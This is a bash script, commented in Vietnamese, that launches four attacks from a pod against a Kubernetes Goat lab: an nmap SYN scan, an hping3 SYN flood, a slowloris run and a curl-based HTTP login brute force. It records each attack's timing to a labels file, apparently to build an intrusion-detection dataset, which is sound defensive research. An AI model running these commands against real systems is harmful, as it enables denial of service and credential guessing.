#!/usr/bin/env bash
# run_attacks.sh — chay tren HOST (trihm-lab), khong phai trong pod.
# Boc timestamp gio host quanh moi attack, tu sinh labels.csv.
# Yeu cau: pod "attacker" dang chay, co nmap/hping3/slowhttptest/curl.
#
# SUA 6 IP duoi day truoc khi chay (lay tu:
#   kubectl get svc -n default -o custom-columns=NAME:.metadata.name,IP:.spec.clusterIP,PORT:.spec.ports[0].port
#   kubectl get pod attacker -o jsonpath='{.status.podIP}')
#
# Chay:  bash run_attacks.sh
set -u

# ---------------- SUA CAC IP NAY ----------------
HOME_IP="10.111.131.201"            # kubernetes-goat-home-service   :80
HEALTH_IP="10.103.40.38"         # health-check-service           :80
SYSMON_IP="10.103.76.167"         # system-monitor-service         :8080
BUILD_IP="10.103.40.38"          # build-code-service             :3000
REGISTRY_IP="10.103.23.43"       # poor-registry-service          :5000
ATTACKER_IP="10.0.0.152"       # pod attacker (podIP) - cho hping3 -a
# ------------------------------------------------

POD="attacker"
LABELS="labels.csv"
echo "attack,start,end" > "$LABELS"

now() { date -u +%Y-%m-%dT%H:%M:%SZ; }

# log_attack <ten> <lenh-chay-trong-pod...>
# ghi start truoc, chay, doi lang (tail), ghi end
run_attack() {
  local name="$1"; shift
  local settle="${SETTLE:-30}"
  local s e
  s=$(now)
  echo ">>> [$name] start $s"
  kubectl exec "$POD" -- "$@"
  local rc=$?
  # cho window rolling 60s cuoi hinh thanh truoc khi dong nhan
  sleep "$settle"
  e=$(now)
  echo "$name,$s,$e" >> "$LABELS"
  echo ">>> [$name] end   $e  (rc=$rc)"
  echo ">>> nghi 120s truoc attack ke tiep..."
  sleep 120
}

echo "===== BAT DAU CHUOI ATTACK ($(now)) ====="
echo "Nho: benign generator phai dang chay nen tren host, va capture da bat >=5 phut truoc."
echo ""

# 1. nmap SYN scan (nhieu service). -Pn vi ClusterIP khong ping duoc.
#    scan tuc thi -> SETTLE=60 tao cua so nhan ~60s de bat distinct_dst_ports_60s.
SETTLE=60 run_attack nmap_synscan \
  nmap -sS -Pn -p 1-10000 "$HOME_IP" "$HEALTH_IP" "$SYSMON_IP" "$BUILD_IP" "$REGISTRY_IP"

# 2. hping3 SYN — KHONG --flood, KHONG spoof (-a IP that) de aggregate thanh flow dam.
#    -i u500 = 1 goi/500us = 2000 pkt/s. 300s.
run_attack hping3_syn \
  timeout 300 hping3 -S -i u500 -p 80 -a "$ATTACKER_IP" "$HEALTH_IP"

# 3. slowloris qua slowhttptest, 300s.
run_attack slowloris \
  timeout 300 slowhttptest -c 500 -H -i 10 -r 50 -t GET -u "http://$SYSMON_IP:8080" -x 24 -p 3

# 4. HTTP brute force (curl loop trong pod).
run_attack http_bruteforce \
  sh -c "for i in \$(seq 1 5000); do curl -s -o /dev/null \"http://$HOME_IP/?user=admin&pass=try\$i\"; done"

echo ""
echo "===== XONG CHUOI ATTACK ($(now)) ====="
echo ">>> QUAN TRONG: de capture chay them >=3 phut nua roi moi tat sensor."
echo ">>> Kiem tra tail -1 cua log sensor phai co timestamp > end cua brute o tren."
echo ""
echo "===== labels.csv ====="
cat "$LABELS"
